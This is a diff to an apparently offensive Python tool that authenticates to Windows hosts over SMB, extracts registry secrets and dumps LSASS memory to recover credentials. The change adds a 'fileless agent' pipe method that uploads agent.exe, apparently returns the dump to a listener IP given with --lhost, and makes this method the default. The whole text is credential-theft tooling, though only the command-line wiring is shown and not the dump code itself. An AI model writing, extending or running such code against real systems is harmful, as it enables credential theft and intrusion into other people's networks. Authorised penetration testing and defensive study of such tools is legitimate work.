@@ -5,7 +5,7 @@ import sys
 import os
 
 from .smb import SmbSession
-from .dump.methods import ComSvcsDump, SilentDump
+from .dump.methods import ComSvcsDump, SilentDump, PipeDump
 from .secrets.registry import RegistrySecrets
 from .parser.minidump import parse
 from .parser.extract import CredentialExtractor
@@ -45,13 +45,14 @@ examples:
     dump_parser.add_argument("-d", "--domain", default=".", help="Domain (default: local)")
     dump_parser.add_argument(
         "-m", "--method",
-        choices=["auto", "registry", "comsvcs", "silent"],
+        choices=["auto", "registry", "comsvcs", "silent", "pipe"],
         default="auto",
-        help="Method: auto (registry+lsass), registry (no exec), comsvcs, silent",
+        help="Method: auto (registry+lsass), registry (no exec), comsvcs, silent, pipe (fileless agent)",
     )
     dump_parser.add_argument("--pid", type=int, default=None, help="LSASS PID (auto-detected)")
-    dump_parser.add_argument("--lhost", default=None, help="Listen IP (silent method)")
+    dump_parser.add_argument("--lhost", default=None, help="Listen IP (silent/pipe methods)")
     dump_parser.add_argument("--lport", type=int, default=0, help="Listen port (silent method)")
+    dump_parser.add_argument("--agent", default=None, help="Path to agent.exe (pipe method)")
     dump_parser.add_argument("-o", "--output", default=None, help="Save raw LSASS dump to file")
 
     # ─── parse command ──────────────────────────────────────────────────────
@@ -77,7 +78,7 @@ def cmd_dump(args):
         print(f"[+] Authenticated as {args.domain}\\{args.username}")
 
         do_registry = args.method in ("auto", "registry")
-        do_lsass = args.method in ("auto", "comsvcs", "silent")
+        do_lsass = args.method in ("auto", "comsvcs", "silent", "pipe")
 
         # ─── Registry secrets ───────────────────────────────────────────
         if do_registry:
@@ -148,9 +149,15 @@ def _dump_lsass(session: SmbSession, args):
     print()
     print("── LSASS Memory ─────────────────────────────────────────────")
 
-    method_name = args.method if args.method not in ("auto", "registry") else "comsvcs"
+    method_name = args.method if args.method not in ("auto", "registry") else "pipe"
 
-    if method_name == "comsvcs":
+    if method_name == "pipe":
+        if not args.lhost:
+            print("[!] --lhost required for pipe method")
+            return
+        agent_path = args.agent or "agent/bin/agent.exe"
+        method = PipeDump(session, args.lhost, agent_path)
+    elif method_name == "comsvcs":
         method = ComSvcsDump(session)
     elif method_name == "silent":
         if not args.lhost:
